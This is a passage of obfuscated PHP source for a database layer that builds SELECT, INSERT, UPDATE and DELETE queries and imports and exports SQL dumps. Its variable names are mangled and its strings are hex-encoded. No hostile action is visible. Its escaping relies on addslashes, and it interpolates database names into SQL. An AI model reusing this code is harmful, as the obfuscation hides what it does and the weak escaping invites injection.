($ƒ—â´ûŒ[382] == $Û‚´…Ò) { $¶åö¯ÍŸ .= $ƒ—â´ûŒ[984] . $çî €¹ . $ƒ—â´ûŒ[53] . $×ğÛƒôé[1] . $ƒ—â´ûŒ[1099]; } elseif (preg_match($ƒ—â´ûŒ[1100], $×ğÛƒôé[0])) { $¶åö¯ÍŸ .= $×ğÛƒôé[0]; } elseif (preg_match($ƒ—â´ûŒ[1101], $×ğÛƒôé[0])) { if (isset($×ğÛƒôé[2]) && $ƒ—â´ûŒ[382] == $×ğÛƒôé[2]) { $¶åö¯ÍŸ .= $çî €¹ . $ƒ—â´ûŒ[53] . $this->exp[$Û‚´…Ò] . $ƒ—â´ûŒ[53] . $×ğÛƒôé[1]; } else { if (is_string($×ğÛƒôé[1])) { $×ğÛƒôé[1] = explode($ƒ—â´ûŒ[50], $×ğÛƒôé[1]); } $­®Ğú‘í = implode($ƒ—â´ûŒ[50], $this->parseValue($×ğÛƒôé[1])); $¶åö¯ÍŸ .= $çî €¹ . $ƒ—â´ûŒ[53] . $this->exp[$Û‚´…Ò] . $ƒ—â´ûŒ[984] . $­®Ğú‘í . $ƒ—â´ûŒ[986]; } } elseif (preg_match($ƒ—â´ûŒ[1102], $×ğÛƒôé[0])) { $º”ªéúÄ = is_string($×ğÛƒôé[1]) ? explode($ƒ—â´ûŒ[50], $×ğÛƒôé[1]) : $×ğÛƒôé[1]; $¶åö¯ÍŸ .= $ƒ—â´ûŒ[984] . $çî €¹ . $ƒ—â´ûŒ[53] . $this->exp[$Û‚´…Ò] . $ƒ—â´ûŒ[53] . $this->parseValue($º”ªéúÄ[0]) . $ƒ—â´ûŒ[1085] . $this->parseValue($º”ªéúÄ[1]) . $ƒ—â´ûŒ[364]; } else { think_exception(think_lang($ƒ—â´ûŒ[1088]) . $ƒ—â´ûŒ[4] . $×ğÛƒôé[0]); } } else { $™ªÑ˜Ûí = count($×ğÛƒôé); $û÷­Íñ = $ƒ—â´ûŒ[12]; if (is_string($×ğÛƒôé[$™ªÑ˜Ûí - 1])) { $û÷­Íñ = isset($×ğÛƒôé[$™ªÑ˜Ûí - 1]) ? strtoupper($×ğÛƒôé[$™ªÑ˜Ûí - 1]) : $ƒ—â´ûŒ[12]; if (in_array($û÷­Íñ, array($ƒ—â´ûŒ[1082], $ƒ—â´ûŒ[1083], $ƒ—â´ûŒ[1084]))) { $™ªÑ˜Ûí = $™ªÑ˜Ûí - 1; } } else { $û÷­Íñ = $ƒ—â´ûŒ[1082]; } for ($³’ş£¦Ø = 0; $³’ş£¦Ø < $™ªÑ˜Ûí; $³’ş£¦Ø++) { $º”ªéúÄ = is_array($×ğÛƒôé[$³’ş£¦Ø]) ? $×ğÛƒôé[$³’ş£¦Ø][1] : $×ğÛƒôé[$³’ş£¦Ø]; if ($ƒ—â´ûŒ[382] == strtolower($×ğÛƒôé[$³’ş£¦Ø][0])) { $¶åö¯ÍŸ .= $ƒ—â´ûŒ[346] . $çî €¹ . $ƒ—â´ûŒ[53] . $º”ªéúÄ . $ƒ—â´ûŒ[1099] . $û÷­Íñ . $ƒ—â´ûŒ[53]; } else { $Ñ—­°ö’ = is_array($×ğÛƒôé[$³’ş£¦Ø]) ? $this->exp[strtolower($×ğÛƒôé[$³’ş£¦Ø][0])] : $ƒ—â´ûŒ[515]; if (!$Ñ—­°ö’ && is_array($×ğÛƒôé[$³’ş£¦Ø]) && in_array($×ğÛƒôé[$³’ş£¦Ø][0], array($ƒ—â´ûŒ[515], $ƒ—â´ûŒ[1092], $ƒ—â´ûŒ[1093], $ƒ—â´ûŒ[1094], $ƒ—â´ûŒ[1095], $ƒ—â´ûŒ[1096]))) { $Ñ—­°ö’ = $×ğÛƒôé[$³’ş£¦Ø][0]; } $¶åö¯ÍŸ .= $ƒ—â´ûŒ[346] . $çî €¹ . $ƒ—â´ûŒ[53] . $Ñ—­°ö’ . $ƒ—â´ûŒ[53] . $this->parseValue($º”ªéúÄ) . $ƒ—â´ûŒ[1099] . $û÷­Íñ . $ƒ—â´ûŒ[53]; } } $¶åö¯ÍŸ = substr($¶åö¯ÍŸ, 0, -4); } } else { $¶åö¯ÍŸ .= $çî €¹ . $ƒ—â´ûŒ[1103] . $this->parseValue($×ğÛƒôé); } return $¶åö¯ÍŸ; } protected function parseThinkWhere($şËâıá, $«ìøœ»×) { $šèâ€ó• =& $_SERVER[ÕŸ²ó÷å]; $¨åıÔÏÎ = $šèâ€ó•[12]; switch ($şËâıá) { case $šèâ€ó•[437]: $¨åıÔÏÎ = $«ìøœ»×; break; case $šèâ€ó•[1086]: $¨åıÔÏÎ = is_string($«ìøœ»×) ? $«ìøœ»× : substr($this->parseWhere($«ìøœ»×), 6); break; case $šèâ€ó•[1104]: parse_str($«ìøœ»×, $µØš‘ö§); if (isset($µØš‘ö§[$šèâ€ó•[1081]])) { $¼ìºñ¶´ = $šèâ€ó•[53] . strtoupper($µØš‘ö§[$šèâ€ó•[1081]]) . $šèâ€ó•[53]; unset($µØš‘ö§[$šèâ€ó•[1081]]); } else { $¼ìºñ¶´ = $šèâ€ó•[1085]; } $«Ğ¤Îì¨ = array(); foreach ($µØš‘ö§ as $Ï•å³öÄ => $ïä˜î´İ) { $«Ğ¤Îì¨[] = $this->parseKey($Ï•å³öÄ) . $šèâ€ó•[1103] . $this->parseValue($ïä˜î´İ); } $¨åıÔÏÎ = implode($¼ìºñ¶´, $«Ğ¤Îì¨); break; } return $¨åıÔÏÎ; } protected function parseLimit($ĞÀ¸Èì©) { $ı×Ñ§å” =& $_SERVER[ÕŸ²ó÷å]; return !empty($ĞÀ¸Èì©) ? $ı×Ñ§å”[51] . $ĞÀ¸Èì© . $ı×Ñ§å”[53] : $ı×Ñ§å”[12]; } protected function parseJoin($õ­ºîã½) { $ì“Á”Ç” =& $_SERVER[ÕŸ²ó÷å]; $•÷š‹°Î = $ì“Á”Ç”[12]; if (!empty($õ­ºîã½)) { if (is_array($õ­ºîã½)) { foreach ($õ­ºîã½ as $·ôù¥éÎ => $”¾ë¼—) { if (!1 !== stripos($”¾ë¼—, $ì“Á”Ç”[1105])) { $•÷š‹°Î .= $ì“Á”Ç”[53] . $”¾ë¼—; } else { $•÷š‹°Î .= $ì“Á”Ç”[1106] . $”¾ë¼—; } } } else { $•÷š‹°Î .= $ì“Á”Ç”[1106] . $õ­ºîã½; } } $•÷š‹°Î = preg_replace($ì“Á”Ç”[1107], think_config($ì“Á”Ç”[1011]) . $ì“Á”Ç”[1108], $•÷š‹°Î); return $•÷š‹°Î; } protected function parseOrder($¦õ†è…Í) { $Å”‚—Õš =& $_SERVER[ÕŸ²ó÷å]; if (is_array($¦õ†è…Í)) { $Ä¿ØãË… = array(); foreach ($¦õ†è…Í as $•ÄúÉ· => $‹‘†‘°Å) { if (is_numeric($•ÄúÉ·)) { $Ä¿ØãË…[] = $this->parseKey($‹‘†‘°Å); } else { $‹‘†‘°Å = in_array(strtoupper(trim($‹‘†‘°Å)), array($Å”‚—Õš[1109], $Å”‚—Õš[1110])) ? $Å”‚—Õš[53] . $‹‘†‘°Å : $Å”‚—Õš[12]; if (preg_match($Å”‚—Õš[1111], $•ÄúÉ·)) { $Ä¿ØãË…[] = $this->parseKey($•ÄúÉ·) . $‹‘†‘°Å; } else { think_exception($Å”‚—Õš[1112] . $•ÄúÉ·); } } } $¦õ†è…Í = implode($Å”‚—Õš[50], $Ä¿ØãË…); } return !empty($¦õ†è…Í) ? $Å”‚—Õš[1113] . $¦õ†è…Í : $Å”‚—Õš[12]; } protected function parseGroup($ú¬úÛĞÃ) { $şØ¾³Ëğ =& $_SERVER[ÕŸ²ó÷å]; return !empty($ú¬úÛĞÃ) ? $şØ¾³Ëğ[1114] . $ú¬úÛĞÃ : $şØ¾³Ëğ[12]; } protected function parseHaving($˜ÊÜÙÑ) { $ª”õ™ĞÍ =& $_SERVER[ÕŸ²ó÷å]; return !empty($˜ÊÜÙÑ) ? $ª”õ™ĞÍ[1115] . $˜ÊÜÙÑ : $ª”õ™ĞÍ[12]; } protected function parseComment($éß€¹ã¿) { $ä—üÍ” =& $_SERVER[ÕŸ²ó÷å]; return !empty($éß€¹ã¿) ? $ä—üÍ”[1116] . $éß€¹ã¿ . $ä—üÍ”[1117] : $ä—üÍ”[12]; } protected function parseDistinct($’¢‚¬µ­) { $©ìÅ¥‚² =& $_SERVER[ÕŸ²ó÷å]; return !empty($’¢‚¬µ­) ? $©ìÅ¥‚²[1118] : $©ìÅ¥‚²[12]; } protected function parseUnion($Ş³â‰­Å) { $¢§Ÿë¨ =& $_SERVER[ÕŸ²ó÷å]; if (empty($Ş³â‰­Å)) { return $¢§Ÿë¨[12]; } if (isset($Ş³â‰­Å[$¢§Ÿë¨[433]])) { $ºŒ·Ê°ó = $¢§Ÿë¨[1119]; unset($Ş³â‰­Å[$¢§Ÿë¨[433]]); } else { $ºŒ·Ê°ó = $¢§Ÿë¨[1120]; } foreach ($Ş³â‰­Å as $ôÅ‘©¥Ó) { $·ÄÁ°†ƒ[] = $ºŒ·Ê°ó . (is_array($ôÅ‘©¥Ó) ? $this->buildSelectSql($ôÅ‘©¥Ó) : $ôÅ‘©¥Ó); } return implode($¢§Ÿë¨[53], $·ÄÁ°†ƒ); } public function insert($‰³Á¦ûÇ, $»„ûˆ½ = array(), $íÆóÃÉ´ = false) { $«ßÎˆ¤ó =& $_SERVER[ÕŸ²ó÷å]; $óë·©ßÂ = $àÚÆùõ“ = array(); $this->model = $»„ûˆ½[$«ßÎˆ¤ó[367]]; foreach ($‰³Á¦ûÇ as $äˆò»ºÚ => $ÅÌÅš†¢) { if (is_array($ÅÌÅš†¢) && $«ßÎˆ¤ó[382] == $ÅÌÅš†¢[0]) { $àÚÆùõ“[] = $this->parseKey($äˆò»ºÚ); $óë·©ßÂ[] = $ÅÌÅš†¢[1]; } elseif (is_scalar($ÅÌÅš†¢) || is_null($ÅÌÅš†¢)) { $àÚÆùõ“[] = $this->parseKey($äˆò»ºÚ); $óë·©ßÂ[] = $this->parseValue($ÅÌÅš†¢); } } $æ†Î³ı¸ = ($íÆóÃÉ´ ? $«ßÎˆ¤ó[988] : $«ßÎˆ¤ó[989]) . $«ßÎˆ¤ó[990] . $this->parseTable($»„ûˆ½[$«ßÎˆ¤ó[365]]) . $«ßÎˆ¤ó[984] . implode($«ßÎˆ¤ó[50], $àÚÆùõ“) . $«ßÎˆ¤ó[985] . implode($«ßÎˆ¤ó[50], $óë·©ßÂ) . $«ßÎˆ¤ó[986]; $æ†Î³ı¸ .= $this->parseLock(isset($»„ûˆ½[$«ßÎˆ¤ó[928]]) ? $»„ûˆ½[$«ßÎˆ¤ó[928]] : !1); $æ†Î³ı¸ .= $this->parseComment(!empty($»„ûˆ½[$«ßÎˆ¤ó[439]]) ? $»„ûˆ½[$«ßÎˆ¤ó[439]] : $«ßÎˆ¤ó[12]); return $this->execute($æ†Î³ı¸, $this->parseBind(!empty($»„ûˆ½[$«ßÎˆ¤ó[370]]) ? $»„ûˆ½[$«ßÎˆ¤ó[370]] : array())); } public function selectInsert($ˆøç÷Â¦, $Ãì–ºİÉ, $ì•ÍŠÂ = array()) { $–Âì×âæ =& $_SERVER[ÕŸ²ó÷å]; $this->model = $ì•ÍŠÂ[$–Âì×âæ[367]]; if (is_string($ˆøç÷Â¦)) { $ˆøç÷Â¦ = explode($–Âì×âæ[50], $ˆøç÷Â¦); } array_walk($ˆøç÷Â¦, array($this, $–Âì×âæ[987])); $¼ÕİÃ¡ = $–Âì×âæ[1121] . $this->parseTable($Ãì–ºİÉ) . $–Âì×âæ[984] . implode($–Âì×âæ[50], $ˆøç÷Â¦) . $–Âì×âæ[1099]; $¼ÕİÃ¡ .= $this->buildSelectSql($ì•ÍŠÂ); return $this->execute($¼ÕİÃ¡, $this->parseBind(!empty($ì•ÍŠÂ[$–Âì×âæ[370]]) ? $ì•ÍŠÂ[$–Âì×âæ[370]] : array())); } public function update($§»íÎìÊ, $Õ¸úéùš) { $—¯¨û± =& $_SERVER[ÕŸ²ó÷å]; $this->model = $Õ¸úéùš[$—¯¨û±[367]]; $ÇŒß“Ë® = $—¯¨û±[1122] . $this->parseTable($Õ¸úéùš[$—¯¨û±[365]]) . $this->parseSet($§»íÎìÊ) . $this->parseWhere(!empty($Õ¸úéùš[$—¯¨û±[361]]) ? $Õ¸úéùš[$—¯¨û±[361]] : $—¯¨û±[12]) . $this->parseOrder(!empty($Õ¸úéùš[$—¯¨û±[450]]) ? $Õ¸úéùš[$—¯¨û±[450]] : $—¯¨û±[12]) . $this->parseLimit(!empty($Õ¸úéùš[$—¯¨û±[377]]) ? $Õ¸úéùš[$—¯¨û±[377]] : $—¯¨û±[12]) . $this->parseLock(isset($Õ¸úéùš[$—¯¨û±[928]]) ? $Õ¸úéùš[$—¯¨û±[928]] : !1) . $this->parseComment(!empty($Õ¸úéùš[$—¯¨û±[439]]) ? $Õ¸úéùš[$—¯¨û±[439]] : $—¯¨û±[12]); return $this->execute($ÇŒß“Ë®, $this->parseBind(!empty($Õ¸úéùš[$—¯¨û±[370]]) ? $Õ¸úéùš[$—¯¨û±[370]] : array())); } public function delete($ôÔà = array()) { $±±ª¹Û =& $_SERVER[ÕŸ²ó÷å]; $this->model = $ôÔà[$±±ª¹Û[367]]; $Ññç“ ï = $±±ª¹Û[1123] . $this->parseTable($ôÔà[$±±ª¹Û[365]]) . $this->parseWhere(!empty($ôÔà[$±±ª¹Û[361]]) ? $ôÔà[$±±ª¹Û[361]] : $±±ª¹Û[12]) . $this->parseOrder(!empty($ôÔà[$±±ª¹Û[450]]) ? $ôÔà[$±±ª¹Û[450]] : $±±ª¹Û[12]) . $this->parseLimit(!empty($ôÔà[$±±ª¹Û[377]]) ? $ôÔà[$±±ª¹Û[377]] : $±±ª¹Û[12]) . $this->parseLock(isset($ôÔà[$±±ª¹Û[928]]) ? $ôÔà[$±±ª¹Û[928]] : !1) . $this->parseComment(!empty($ôÔà[$±±ª¹Û[439]]) ? $ôÔà[$±±ª¹Û[439]] : $±±ª¹Û[12]); return $this->execute($Ññç“ ï, $this->parseBind(!empty($ôÔà[$±±ª¹Û[370]]) ? $ôÔà[$±±ª¹Û[370]] : array())); } public function select($ºãèÑÅ = array()) { $ŞŠüõÀó =& $_SERVER[ÕŸ²ó÷å]; $this->model = $ºãèÑÅ[$ŞŠüõÀó[367]]; $ûÎª¸¼ = $this->buildSelectSql($ºãèÑÅ); $ÊÌ•ú¢£ = isset($ºãèÑÅ[$ŞŠüõÀó[434]]) ? $ºãèÑÅ[$ŞŠüõÀó[434]] : !1; if ($ÊÌ•ú¢£) { $´ì”ü¬ = is_string($ÊÌ•ú¢£[$ŞŠüõÀó[107]]) ? $ÊÌ•ú¢£[$ŞŠüõÀó[107]] : $ŞŠüõÀó[1124] . md5($ûÎª¸¼); $İÄßß— = think_cache($´ì”ü¬, $ŞŠüõÀó[12], $ÊÌ•ú¢£); if (!1 !== $İÄßß—) { return $İÄßß—; } } $İèÖ›õ„ = $this->query($ûÎª¸¼, $this->parseBind(!empty($ºãèÑÅ[$ŞŠüõÀó[370]]) ? $ºãèÑÅ[$ŞŠüõÀó[370]] : array())); if ($ÊÌ•ú¢£ && !1 !== $İèÖ›õ„) { think_cache($´ì”ü¬, $İèÖ›õ„, $ÊÌ•ú¢£); } return $İèÖ›õ„; } public function buildSelectSql($½ä›‘”Š = array()) { $§šÁ›‘ =& $_SERVER[ÕŸ²ó÷å]; if (isset($½ä›‘”Š[$§šÁ›‘[438]])) { if (strpos($½ä›‘”Š[$§šÁ›‘[438]], $§šÁ›‘[50])) { list($¥ˆâÉÖ, $ì¾“®¨ë) = explode($§šÁ›‘[50], $½ä›‘”Š[$§šÁ›‘[438]]); } else { $¥ˆâÉÖ = $½ä›‘”Š[$§šÁ›‘[438]]; } $¥ˆâÉÖ = $¥ˆâÉÖ ? $¥ˆâÉÖ : 1; $ì¾“®¨ë = isset($ì¾“®¨ë) ? $ì¾“®¨ë : (is_numeric($½ä›‘”Š[$§šÁ›‘[377]]) ? $½ä›‘”Š[$§šÁ›‘[377]] : 20); $Òìíˆ·Å = $ì¾“®¨ë * ((int) $¥ˆâÉÖ - 1); $½ä›‘”Š[$§šÁ›‘[377]] = $Òìíˆ·Å . $§šÁ›‘[50] . $ì¾“®¨ë; } if (think_config($§šÁ›‘[1125])) { $¢ş­ÖÕè = $§šÁ›‘[1126] . md5(serialize($½ä›‘”Š)); $ìÍî§ú÷ = think_cache($¢ş­ÖÕè); if ($ìÍî§ú÷) { return $ìÍî§ú÷; } } $„è„»¾ = $this->parseSql($this->selectSql, $½ä›‘”Š); $„è„»¾ .= $this->parseLock(isset($½ä›‘”Š[$§šÁ›‘[928]]) ? $½ä›‘”Š[$§šÁ›‘[928]] : !1); if (isset($¢ş­ÖÕè)) { think_cache($¢ş­ÖÕè, $„è„»¾); } return $„è„»¾; } public function parseSql($î¢áÖ¦ˆ, $µàø„ ß = array()) { $§¸Á¡ªò =& $_SERVER[ÕŸ²ó÷å]; $î¢áÖ¦ˆ = str_replace(array($§¸Á¡ªò[1127], $§¸Á¡ªò[1128], $§¸Á¡ªò[1129], $§¸Á¡ªò[1130], $§¸Á¡ªò[1131], $§¸Á¡ªò[1132], $§¸Á¡ªò[1133], $§¸Á¡ªò[1134], $§¸Á¡ªò[1135], $§¸Á¡ªò[1136], $§¸Á¡ªò[1137]), array($this->parseTable("{$µàø„ ß[$§¸Á¡ªò[365]]}"), $this->parseDistinct(isset($µàø„ ß[$§¸Á¡ªò[1138]]) ? $µàø„ ß[$§¸Á¡ªò[1138]] : !1), $this->parseField(!empty($µàø„ ß[$§¸Á¡ªò[359]]) ? $µàø„ ß[$§¸Á¡ªò[359]] : $§¸Á¡ªò[230]), $this->parseJoin(!empty($µàø„ ß[$§¸Á¡ªò[368]]) ? $µàø„ ß[$§¸Á¡ªò[368]] : $§¸Á¡ªò[12]), $this->parseWhere(!empty($µàø„ ß[$§¸Á¡ªò[361]]) ? $µàø„ ß[$§¸Á¡ªò[361]] : $§¸Á¡ªò[12]), $this->parseGroup(!empty($µàø„ ß[$§¸Á¡ªò[587]]) ? $µàø„ ß[$§¸Á¡ªò[587]] : $§¸Á¡ªò[12]), $this->parseHaving(!empty($µàø„ ß[$§¸Á¡ªò[1139]]) ? $µàø„ ß[$§¸Á¡ªò[1139]] : $§¸Á¡ªò[12]), $this->parseOrder(!empty($µàø„ ß[$§¸Á¡ªò[450]]) ? $µàø„ ß[$§¸Á¡ªò[450]] : $§¸Á¡ªò[12]), $this->parseLimit(!empty($µàø„ ß[$§¸Á¡ªò[377]]) ? $µàø„ ß[$§¸Á¡ªò[377]] : $§¸Á¡ªò[12]), $this->parseUnion(!empty($µàø„ ß[$§¸Á¡ªò[432]]) ? $µàø„ ß[$§¸Á¡ªò[432]] : $§¸Á¡ªò[12]), $this->parseComment(!empty($µàø„ ß[$§¸Á¡ªò[439]]) ? $µàø„ ß[$§¸Á¡ªò[439]] : $§¸Á¡ªò[12])), $î¢áÖ¦ˆ); return $î¢áÖ¦ˆ; } public function getLastSql($˜ºó’´Ÿ = '') { return $˜ºó’´Ÿ ? $this->modelSql[$˜ºó’´Ÿ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($†Ä–Èö¹) { return addslashes($†Ä–Èö¹); } public function setModel($Ò«ÚÚ¥ò) { $this->model = $Ò«ÚÚ¥ò; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($¹ô¬ä™š = array()) { $ÓˆŠª†¾ =& $_SERVER[ÕŸ²ó÷å]; if (empty($¹ô¬ä™š)) { $¹ô¬ä™š = $GLOBALS[$ÓˆŠª†¾[6]][$ÓˆŠª†¾[21]]; } $this->database = $¹ô¬ä™š; } public function model($´”÷ßÛ¦ = '') { return new ModelBase($´”÷ßÛ¦, $_SERVER[ÕŸ²ó÷å][12], $this->database); } public function db($íø“Ö‰Î = false) { $İÊ½şÙŸ =& $_SERVER[ÕŸ²ó÷å]; $Ú…Ğ‡ê… = array_change_key_case($this->database); if ($this->dbType() == $İÊ½şÙŸ[13] || !$íø“Ö‰Î) { return $this->model()->db(); } $Š¹ÀäÊõ = $Ú…Ğ‡ê…[$İÊ½şÙŸ[1053]]; $Ú…Ğ‡ê…[$İÊ½şÙŸ[1053]] = $İÊ½şÙŸ[12]; if ($Ú…Ğ‡ê…[$İÊ½şÙŸ[1048]] == $İÊ½şÙŸ[1045]) { $Ãé‹´‚ß = $Ú…Ğ‡ê…[$İÊ½şÙŸ[1054]]; $Ú…Ğ‡ê…[$İÊ½şÙŸ[1054]] = substr($Ãé‹´‚ß, 0, strrpos($Ãé‹´‚ß, $İÊ½şÙŸ[1140])); } $this->database = $Ú…Ğ‡ê…; $Ç°šÒ…Ù = $this->model()->db(); try { $³ªŠì¿î = $Ç°šÒ…Ù->execute("\163\x68\x6f\x77\40\x64\x61\164\141\x62\x61\x73\x65\163\40\x6c\x69\x6b\145\40\47{$Š¹ÀäÊõ}\47"); } catch (Exception $ºÑ™†) { } if (!$³ªŠì¿î) { $Ç°šÒ…Ù->execute("\x63\162\145\x61\164\145\x20\144\141\164\x61\x62\x61\x73\x65\40\x60{$Š¹ÀäÊõ}\140"); } $Ú…Ğ‡ê…[$İÊ½şÙŸ[1053]] = $Š¹ÀäÊõ; if ($Ú…Ğ‡ê…[$İÊ½şÙŸ[1048]] == $İÊ½şÙŸ[1045]) { $Ú…Ğ‡ê…[$İÊ½şÙŸ[1054]] .= $İÊ½şÙŸ[1140] . $Š¹ÀäÊõ; } $this->database = $Ú…Ğ‡ê…; $Ç°šÒ…Ù->execute("\x75\163\x65\40\140{$Š¹ÀäÊõ}\140"); return $Ç°šÒ…Ù; } public function createTable($×ÓüŸ, &$Ú¬ˆÑÊ¢) { $æÛœ =& $_SERVER[ÕŸ²ó÷å]; if (!IO::exist($×ÓüŸ)) { ActionCall($æÛœ[1141], !0, 0); show_json(LNG($æÛœ[1142]), !1); } $¾û±˜¯ = $this->model()->db(); $ØüÄÜ÷Ç = sqlSplit(IO::getContent($×ÓüŸ)); foreach ($ØüÄÜ÷Ç as $°†ø×Â¢) { $äµÔ¼ = stripos($°†ø×Â¢, $æÛœ[1143]) === 0; if ($äµÔ¼) { $Ú¬ˆÑÊ¢->task[$æÛœ[1144]] += 1; } $¾û±˜¯->execute($°†ø×Â¢); if ($äµÔ¼) { preg_match($æÛœ[1145], $°†ø×Â¢, $´ÙÉÜ‚Ê); $Ú¬ˆÑÊ¢->task[$æÛœ[1146]] = $´ÙÉÜ‚Ê[1]; $Ú¬ˆÑÊ¢->update(1); } } } public function insertTable($õ¦™êº”, &$¯ÎÈÖğÅ) { $¢ó¯ñ« =& $_SERVER[ÕŸ²ó÷å]; $â²ïöò = $this->model()->db(); $à‘ÖÈóˆ = $êåÇ™¯Š ? array($êåÇ™¯Š) : $â²ïöò->getTables(); foreach ($õ¦™êº” as $ÕÌı’…) { $êåÇ™¯Š = basename($ÕÌı’…, $¢ó¯ñ«[872]); if (!in_array($êåÇ™¯Š, $à‘ÖÈóˆ)) { continue; } $¯ÎÈÖğÅ->task[$¢ó¯ñ«[1146]] = $êåÇ™¯Š; if (get_filesize($ÕÌı’…) == 0) { continue; } $ıìÔ‰–® = $this->sqlToDb($ÕÌı’…, $¯ÎÈÖğÅ); if (!$ıìÔ‰–®) { ActionCall($¢ó¯ñ«[1141], !0, 0); show_json(LNG($¢ó¯ñ«[1147]) . "\x5b{$êåÇ™¯Š}\135", !1); } } } public function sqlFromDb($¢ƒêø¬Ã, $µÂæ‘Ğ„, &$±ˆæî·å, $‡ãÑèÉ‹ = '') { if ($±ˆæî·å) { $±ˆæî·å->task[$_SERVER[ÕŸ²ó÷å][1146]] = $¢ƒêø¬Ã; } $½éåØéî = $this->model($¢ƒêø¬Ã); $ß¾¯äø = 0; $ì´¼µ–µ = 0; $†Şòş = 10000; $–Œçˆé¸ = fopen($µÂæ‘Ğ„, $_SERVER[ÕŸ²ó÷å][1148]); $ª«ëë = $½éåØéî->getPk(); $âƒÕÛŠÑ = $½éåØéî->getDbFields(); $¤©ØÍ›÷ = $_SERVER[ÕŸ²ó÷å][12]; if ($GLOBALS[$_SERVER[ÕŸ²ó÷å][871]] && in_array($¢ƒêø¬Ã, array($_SERVER[ÕŸ²ó÷å][1149], $_SERVER[ÕŸ²ó÷å][1150]))) { $¤©ØÍ›÷ = $¢ƒêø¬Ã; } do { $Æ¨“ÂÌ“ = array($ª«ëë => array($_SERVER[ÕŸ²ó÷å][1095], $ì´¼µ–µ)); $æÈ´ä±à = $½éåØéî->where($Æ¨“ÂÌ“)->field($âƒÕÛŠÑ)->order($ª«ëë . $_SERVER[ÕŸ²ó÷å][1151])->limit($†Şòş)->select(); $æÈ´ä±à = !empty($æÈ´ä±à) ? $æÈ´ä±à : array(); if (!($Ç—¹Üà = count($æÈ´ä±à))) { break; } $›©éÍ°¥ = end($æÈ´ä±à); $ì´¼µ–µ = $›©éÍ°¥[$ª«ëë]; $ÏŒŞóÔ = array(); foreach ($æÈ´ä±à as $ğóòûêã) { if ($¤©ØÍ›÷) { if ($¢ƒêø¬Ã == $_SERVER[ÕŸ²ó÷å][1149]) { if ($ğóòûêã[$_SERVER[ÕŸ²ó÷å][33]] == $_SERVER[ÕŸ²ó÷å][1152]) { $äœ×àÑØ = json_decode($ğóòûêã[$_SERVER[ÕŸ²ó÷å][459]], !0); if ($äœ×àÑØ[$_SERVER[ÕŸ²ó÷å][32]] == $GLOBALS[$_SERVER[ÕŸ²ó÷å][871]] && $äœ×àÑØ[$_SERVER[ÕŸ²ó÷å][834]] != 1) { continue; } } } else { if ($ğóòûêã[$_SERVER[ÕŸ²ó÷å][33]] == $_SERVER[ÕŸ²ó÷å][1153] && $ğóòûêã[$_SERVER[ÕŸ²ó÷å][107]] == $_SERVER[ÕŸ²ó÷å][866]) { continue; } } } if ($‡ãÑèÉ‹) { $ğóòûêã[$_SERVER[ÕŸ²ó÷å][97]] = "\x7b\x69\157\x3a{$‡ãÑèÉ‹}\175" . substr($ğóòûêã[$_SERVER[ÕŸ²ó÷å][97]], strlen("\x7b\151\x6f\72{$ğóòûêã[$_SERVER[ÕŸ²ó÷å][901]]}\175")); $ğóòûêã[$_SERVER[ÕŸ²ó÷å][901]] = $‡ãÑèÉ‹; } $ÏŒŞóÔ[] = $_SERVER[ÕŸ²ó÷å][1154] . $this->sqlEncode($ğóòûêã) . $_SERVER[ÕŸ²ó÷å][1155]; } $°ÒşÇÁ¢ = "\x49\116\x53\x45\x52\x54\40\111\116\124\117\x20\140{$¢ƒêø¬Ã}\140\x20\50\140" . implode($_SERVER[ÕŸ²ó÷å][1156], $âƒÕÛŠÑ) . $_SERVER[ÕŸ²ó÷å][1157]; fwrite($–Œçˆé¸, $°ÒşÇÁ¢ . implode($_SERVER[ÕŸ²ó÷å][1158], $ÏŒŞóÔ) . $_SERVER[ÕŸ²ó÷å][84] . PHP_EOL); $ß¾¯äø += $Ç—¹Üà; if ($±ˆæî·å) { $±ˆæî·å->update($Ç—¹Üà); } } while ($†Şòş == $Ç—¹Üà); fclose($–Œçˆé¸); return $ß¾¯äø; } public function sqlToDb($õ£øÍØ, &$†÷Êø˜¥) { $Î‚ëÁº° =& $_SERVER[ÕŸ²ó÷å]; $ŒÎå‚—‚ = $this->model()->db(); $¶ÎÈãîÍ = @fopen($õ£øÍØ, $Î‚ëÁº°[1159]); if (!$¶ÎÈãîÍ) { return !1; } $·£ı–¼” = 0; $³Ò»ÛÍ­ = $Î‚ëÁº°[12]; $ĞÕ•°ÍÂ = array(); $Ÿ¿ •Ö¦ = $this->dbType(); $—Éîá™ = $Ÿ¿ •Ö¦ == $Î‚ëÁº°[13] ? 500 : 2000; $Ñ¸ğÏ·¹ = basename($õ£øÍØ, $Î‚ëÁº°[872]); $­êÕ±Ä = 0; $õµ¡¡Ü‡ = 4194304; while (!feof($¶ÎÈãîÍ)) { $ÎÎëÌŠç = trim(fgets($¶ÎÈãîÍ)); if (!$ÎÎëÌŠç) { continue; } $ÓíŒ€úÜ = $this->sqlDecode($ÎÎëÌŠç, $Ÿ¿ •Ö¦, $Ñ¸ğÏ·¹); if (stripos($ÓíŒ€úÜ, $Î‚ëÁº°[440]) === 0) { if (!$³Ò»ÛÍ­) { $³Ò»ÛÍ­ = $ÓíŒ€úÜ . $Î‚ëÁº°[53]; } continue; } if ($†÷Êø˜¥) { $†÷Êø˜¥->task[$Î‚ëÁº°[1144]] += 1; } $·£ı–¼”++; $ĞÕ•°ÍÂ[] = rtrim(rtrim(trim($ÓíŒ€úÜ), $Î‚ëÁº°[50]), $Î‚ëÁº°[84]); $¥©¹¦àù = null; $¹şè•¨ = strlen($ÓíŒ€úÜ); $­êÕ±Ä += $¹şè•¨; $Úâ•«·Ò = strlen($³Ò»ÛÍ­) + $­êÕ±Ä + (count($ĞÕ•°ÍÂ) - 1); if ($Úâ•«·Ò >= $õµ¡¡Ü‡) { $¥©¹¦àù = array_pop($ĞÕ•°ÍÂ); if ($·£ı–¼” > 1) { $·£ı–¼”--; } } if ($·£ı–¼” >= $—Éîá™ || $¥©¹¦àù) { $ÓíŒ€úÜ = $³Ò»ÛÍ­ . implode($Î‚ëÁº°[50], $ĞÕ•°ÍÂ); if (!$ŒÎå‚—‚->execute($ÓíŒ€úÜ)) { return !1; } if ($†÷Êø˜¥) { $†÷Êø˜¥->update($·£ı–¼”); } $ĞÕ•°ÍÂ = array(); $·£ı–¼” = 0; $­êÕ±Ä = 0; if ($¥©¹¦àù) { $ĞÕ•°ÍÂ = array($¥©¹¦àù); $·£ı–¼” = 1; 